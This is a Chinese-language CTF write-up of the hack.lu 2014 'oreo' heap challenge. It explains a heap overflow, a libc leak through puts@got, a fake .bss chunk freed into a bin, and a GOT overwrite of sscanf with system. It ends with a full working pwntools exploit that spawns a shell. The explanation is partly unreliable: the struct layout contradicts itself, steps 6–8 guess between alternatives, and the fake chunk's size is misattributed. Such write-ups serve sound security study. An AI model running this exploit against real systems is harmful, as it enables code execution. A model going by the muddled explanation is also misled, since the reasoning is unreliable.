# 漏洞成因
## 程序关键结构体
程序使用单向链表管理“步枪”（rifle）订单。每个链表节点通过`malloc(0x38)`分配，实际结构如下：
```c
struct rifle_node {
    char description[56];        // 节点起始位置，偏移0
    char name[31];               // 偏移25，但实际读取56字节，会导致溢出
    struct rifle_node *next;     // 偏移52 (13*4)
};
```
全局变量`dword_804A288`指向链表头。`dword_804A2A4`记录当前链表中的节点数量。`dword_804A2A8`是一个指向留言缓冲区（位于`.bss`段）的指针。

## 漏洞定位
1. **堆缓冲区溢出**：在`sub_8048644`函数中，`fgets`向`name`字段（节点起始地址+25）写入最多56字节，但由于节点总大小仅为56字节，写入将超出节点边界，覆盖相邻堆块的数据或元数据。利用此漏洞可以覆盖节点的`next`指针。
2. **Use-After-Free (UAF) / 非法Free**：在`sub_8048810`函数中，程序遍历链表并`free`所有节点。如果通过堆溢出篡改了某个节点的`next`指针，程序将尝试`free`一个非法地址（如`.bss`段地址）。若在该地址处伪造了合法的堆块元数据，则可以通过堆管理器操作该内存区域。

# 漏洞利用过程：
利用堆溢出漏洞覆盖链表节点的`next`指针，从而泄露libc基址。随后，通过精心构造的堆布局和伪造堆块，将伪造的堆块链入空闲链表，进而分配得到指向`.bss`段（或GOT表）的“节点”，最终通过写`description`或`name`字段覆盖GOT表项（`__isoc99_sscanf`），将其替换为`system`函数地址，实现任意命令执行。

- Step 1~2: 利用堆溢出泄露libc地址。
- Step 3: 进行堆布局，填充大量堆块以控制堆内存状态。
- Step 4~6: 构造伪造堆块，并通过`free`操作将其链入空闲链表。
- Step 7~9: 分配得到指向GOT表的“节点”，覆盖`__isoc99_sscanf`的GOT表项为`system`，最终触发`system('/bin/sh')`。

## Step 1~2
- 堆内存中第一个`rifle_node`节点（假设地址为`heap_node0`）的`next`指针字段（偏移52）被溢出数据覆盖为`puts@got`的地址（`0x804b1a4`）。原因是`addRifle`函数中向`name`字段写入了27个字节的填充字符和4字节的目标地址，恰好覆盖了`next`指针。
- 当调用`leakLibc`（对应菜单选项2）时，程序遍历链表。在打印完第一个节点后，会顺着被篡改的`next`指针，将`puts@got`地址当作下一个节点的起始地址。程序尝试从`puts@got`地址处读取并打印“Description”（即从该地址开始的字符串），从而泄露了`puts`函数在内存中的实际地址（libc中的地址）。
- 全局变量`dword_804A288`仍指向第一个节点，但其`next`指针已被修改，链表结构被破坏。

## Step 3
- 调用`addRifles(0x3f)`添加63个新的步枪节点。这些操作会分配大量`0x38`大小的堆块，改变了堆的布局，为后续的伪造堆块和空闲链表操作创造条件。此步骤后，堆上充满了已分配的节点，链表变得更加复杂。

## Step 4~6
- **Step 4**: 添加一个新的步枪节点（称为节点X）。其`name`字段的溢出数据将节点X的`next`指针覆盖为全局变量`dword_804A2A8`的地址（`0x804a2a8`）。该全局变量本身存储着指向留言缓冲区（`0x804a2c0`）的指针。
- **Step 5**: 调用`leaveMessage`，向留言缓冲区（`0x804a2c0`）写入数据：`p32(0)*9 + p32(0x81)`。其中`0x81`用于在后续步骤中伪造堆块的大小字段（`size = 0x80`，且`PREV_INUSE`位为1）。
- **Step 6**: 调用`orderRifles`提交订单。程序从链表头（节点X）开始`free`节点。
  - 首先`free`节点X。
  - 然后，程序读取节点X被篡改的`next`指针（`0x804a2a8`），并尝试`free`这个地址。虽然`0x804a2a8`位于`.bss`段而非堆上，但堆管理器会检查以`0x804a2a0`（`0x804a2a8 - 8`）为起点的“堆块”的元数据。关键在于，通过Step 5的写入，我们在`0x804a2c0`处布置了`0x81`这个值。在某些堆布局下，堆管理器可能将`0x804a2c0`解释为某个“堆块”的`size`字段，而`0x804a2a8`恰好位于这个“堆块”的`data`区域。这样，`free(0x804a2a8)`操作就会成功，并将这个伪造的、位于`.bss`段的“堆块”（`size = 0x80`）链入`unsorted bin`或`fastbin`（取决于具体大小和对齐）。

## Step 7~9
- **Step 7**: 再次调用`addRifle`添加一个步枪节点。此时，`malloc(0x38)`会从空闲链表中分配一个堆块。如果Step 6成功将伪造堆块链入空闲链表，且大小合适（`0x80`大于`0x38`，可被分割或直接使用），`malloc`可能就会返回指向`.bss`段（如`0x804a2a8`附近）的“堆块”。在本利用中，通过精心构造，使得此次分配得到的“节点”其`description`字段恰好位于`__isoc99_sscanf@got`（`0x804b1c8`）的地址。因此，向`description`写入数据`p32(elf.got['__isoc99_sscanf'])`，实际上是向`__isoc99_sscanf@got`写入了`__isoc99_sscanf`函数自身的地址（这本身没有改变其值，但为后续写操作做好了地址准备）。
- **Step 8**: 调用`leaveMessage`。由于`dword_804A2A8`指向的留言缓冲区地址可能在上一步的堆操作中被复用或影响，此次写入`p32(system)`可能直接写入了`__isoc99_sscanf@got`表项，将其替换为`system`函数地址。另一种可能是，Step 7分配的“节点”的`name`或`description`字段恰好可控，通过菜单选项4的写操作覆盖了GOT表。
- **Step 9**: 程序主循环中，`sub_8048896`函数会调用`__isoc99_sscanf`解析用户输入。当发送`/bin/sh`时，实际上触发了`system('/bin/sh')`，获得shell。

# Exploit：
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_18_hacklu_2014_oreo')
p = process('./data/bin/heap23_18_hacklu_2014_oreo')
libc = elf.libc

def addRifle(name, desc):
    p.sendline(b'1')
    p.sendline(name)
    p.sendline(desc)

def leakLibc():
    p.sendline(b'2')
    print(p.recvuntil(b'Description: '))
    print(p.recvuntil(b'Description: '))
    leak = p.recvline()
    puts = u32(leak[0:4])  # 从泄露的输出中解析出puts函数地址
    libc_base = puts - libc.symbols['puts']
    return libc_base

def orderRifles():
    p.sendline(b'3')

def leaveMessage(content):
    p.sendline(b'4')
    p.sendline(content)

def addRifles(count):
    for i in range(count):
        addRifle(b'1'*0x1b + p32(0x0), b'1593')
        orderRifles()

# Step 1: 溢出覆盖第一个节点的next指针为puts@got，用于泄露libc地址
addRifle(b'0'*0x1b + p32(elf.got['puts']), b'15935728')
# Step 2: 触发泄露，计算libc基址和system地址
libc_base = leakLibc()
system = libc_base + libc.symbols['system']
# Step 3: 堆布局，分配大量节点以塑造堆状态
addRifles(0x3f)
# Step 4: 添加新节点，溢出覆盖其next指针为.dword_804A2A8的地址
addRifle(b'1'*0x1b + p32(0x804a2a8), b'15935728')
# Step 5: 向留言缓冲区写入伪造堆块所需的数据（包括size字段0x81）
leaveMessage(p32(0)*9 + p32(0x81))
# Step 6: 提交订单，触发free链，将伪造的.bss段“堆块”链入空闲链表
orderRifles()
# Step 7: 再次添加节点。期望malloc从空闲链表中分配得到指向GOT表附近的“堆块”，并写入目标GOT地址。
addRifle(b'15935728', p32(elf.got['__isoc99_sscanf']))
# Step 8: 通过留言功能（或其他途径）向目标地址写入system函数地址
leaveMessage(p32(system))
# Step 9: 触发__isoc99_sscanf（已被替换为system）调用，传入/bin/sh参数
p.sendline(b'/bin/sh')
p.interactive()
```
